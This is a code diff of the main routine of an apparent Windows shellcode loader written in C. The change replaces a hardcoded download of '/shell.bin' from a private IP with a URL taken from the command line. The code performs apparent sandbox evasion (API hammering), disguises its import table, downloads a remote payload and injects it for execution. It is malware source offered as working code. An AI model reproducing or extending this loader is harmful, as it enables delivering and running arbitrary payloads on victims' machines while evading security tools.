@@ -1,35 +1,48 @@
 #include <Windows.h>
+#include <stdio.h>
+#include <string.h>
 #include "include/common.h"
 
-int main()
+int main(int argc, char* argv[])
 {
-	ApiHammering(2000);
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <url/endpoint>\n", argv[0]);
+        return -1;
+    }
 
-	IatCamouflage();
+    PSTR fullUrl = argv[1];
+   
+    
 
-	unsigned char* pPayload = NULL;
-	
-	PSTR url = "192.168.231.130";
-	PSTR endpoint = "/shell.bin";
-	
-	SIZE_T sSize = Download(&pPayload, url, endpoint, FALSE);
+    if (fullUrl == NULL) {
+        fprintf(stderr, "Invalid format. Expected format: <url/endpoint>\n");
+        return -1;
+    }
 
-	if (sSize == -1)
-		goto _Cleanup;
-	//Printing shellcode
-	/*printf("[*] Shellcode: \n");
-	for (SIZE_T i = 0; i < sSize; i++)
-	{
-		printf("%02X ", pPayload[i]);
-	}
-	printf("\n");*/
+    ApiHammering(2000);
 
-	if (InitiateInjection(pPayload,sSize))
-	{
-		return -1;
-	}
+    IatCamouflage();
+
+    unsigned char* pPayload = NULL;
+
+    SIZE_T sSize = Download(&pPayload, fullUrl, FALSE);
+
+    if (sSize == -1)
+        goto _Cleanup;
+
+    // Printing shellcode
+    /*printf("[*] Shellcode: \n");
+    for (SIZE_T i = 0; i < sSize; i++)
+    {
+        printf("%02X ", pPayload[i]);
+    }
+    printf("\n");*/
+
+    if (InitiateInjection(pPayload, sSize))
+    {
+        return -1;
+    }
 
 _Cleanup:
-	return 0;
-
+    return 0;
 }
